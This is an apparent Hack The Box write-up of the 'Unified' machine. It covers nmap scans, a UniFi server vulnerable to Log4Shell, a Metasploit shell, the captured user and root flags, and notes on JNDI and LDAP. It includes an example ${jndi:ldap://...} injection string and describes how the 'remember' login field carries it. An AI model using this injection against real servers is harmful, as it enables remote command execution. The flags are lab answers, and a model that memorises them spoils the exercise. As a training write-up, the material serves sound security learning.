# Unified

|     Local    |     Remote     |
| ------------ | -------------- |
| 10.10.14.7   | 10.129.104.218 |

This is a mess. See the walk-through to make it work. He based his stuff on this article: 
https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi

----

## Nmap

```
# nmap 10.129.104.218  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 15:21 EDT
Nmap scan report for 10.129.104.218
Host is up (0.078s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
```

```
# nmap -Pn -sSVC -O -p 22,6789,8080,8443 10.129.104.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-22 15:22 EDT
Nmap scan report for 10.129.104.218
Host is up (0.077s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Sat, 22 Jun 2024 19:22:21 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Sat, 22 Jun 2024 19:22:21 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 22 Jun 2024 19:22:21 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.129.104.218:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=6/22%Time=6677246E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,84,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8
SF:080/manage\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2022\x20Jun\x20202
SF:4\x2019:22:21\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions,84
SF:,"HTTP/1\.1\x20302\x20\r\nLocation:\x20http://localhost:8080/manage\r\n
SF:Content-Length:\x200\r\nDate:\x20Sat,\x2022\x20Jun\x202024\x2019:22:21\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x
SF:20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langua
SF:ge:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2022\x20Jun\x2020
SF:24\x2019:22:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>
SF:<html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93
SF:\x20Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-fam
SF:ily:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white
SF:;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-s
SF:ize:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x2
SF:0{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;borde
SF:r:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\
SF:x20Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,24A,"HTTP/1\
SF:.1\x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-La
SF:nguage:\x20en\r\nContent-Length:\x20431\r\nDate:\x20Sat,\x2022\x20Jun\x
SF:202024\x2019:22:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20h
SF:tml><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x20\xe2\x80
SF:\x93\x20Not\x20Found</title><style\x20type=\"text/css\">body\x20{font-f
SF:amily:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:whi
SF:te;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font
SF:-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\
SF:x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;bor
SF:der:none;}</style></head><body><h1>HTTP\x20Status\x20404\x20\xe2\x80\x9
SF:3\x20Not\x20Found</h1></body></html>")%r(Socks5,24E,"HTTP/1\.1\x20400\x
SF:20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20
SF:en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2022\x20Jun\x202024\x201
SF:9:22:21\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
SF:\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request</h1></body></html>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 185.37 seconds
```

## Ports 8080 & 8443

Same page (8080 is http and 8443 is https): Login Screen for UniFi Network version 6.4.54.
- [Vulnerable](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi) 
- Log4j: Java logging library. See: [HTB Article](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation) 
- This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection),

## Metasploit | MSFConsole

Ran the exploit here. Got a shell. Ran `find` for txt files. Got the user flag: 
```
unifi@unified:/unifi/data/db$ find / -name "*.txt" 2>/dev/null
/home/michael/user.txt

cat /home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127
```

## NOTE: JNDI

JNDI stands for Java Naming and Directory Interface [[source](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)].
- JNDI allows distributed applications to look up services in an abstract, resource-independent way.
- The most common use case is to set up a database connection pool on a Java EE application server. Any application that's deployed on that server can gain access to the connections they need using the JNDI name java:comp/env/FooBarPool without having to know the details about the connection.

If there is a JNDI reference in the log entry, Log4j uses the JNDI feature to request data from an LDAP (Lightweight Directory Access Protocol) server. 
- For example, an expression ${jndi:ldap://example.com/file} specifies the lookup through LDAP protocol and loads data from the URL example.com.

## LDAP

[Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/ubiquiti_unifi_log4shell/): The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability whereby a JNDI string can be sent to the server via the 'remember' field of a POST request to the /api/login endpoint that will cause the server to connect to the attacker and deserialize a malicious Java object. This results in OS command execution in the context of the server application. This module will start an LDAP server that the target will need to connect to. 

Therefore we need to know the port number of LDAP: 
- Port 389 and 636 are both registered ports for LDAP
- Port 389 is the default port
- Port 636 supports encryption via SSL/TLS

## MongoDB

MongoDB is running on port 27117. (google search)

The default database name for UniFi applications is `ace`. (google search)

## Walk-Through

Way over my head...

/root
root@unified:~# ls
root.txt
root@unified:~# cat root.txt 
e50bc93c75b634e4b272d2f771c33681
root@unified:~# 


![image](https://github.com/GregKedrovsky/Hacking/assets/26492233/9872226b-1f7f-421e-be05-397b88bc4de0)










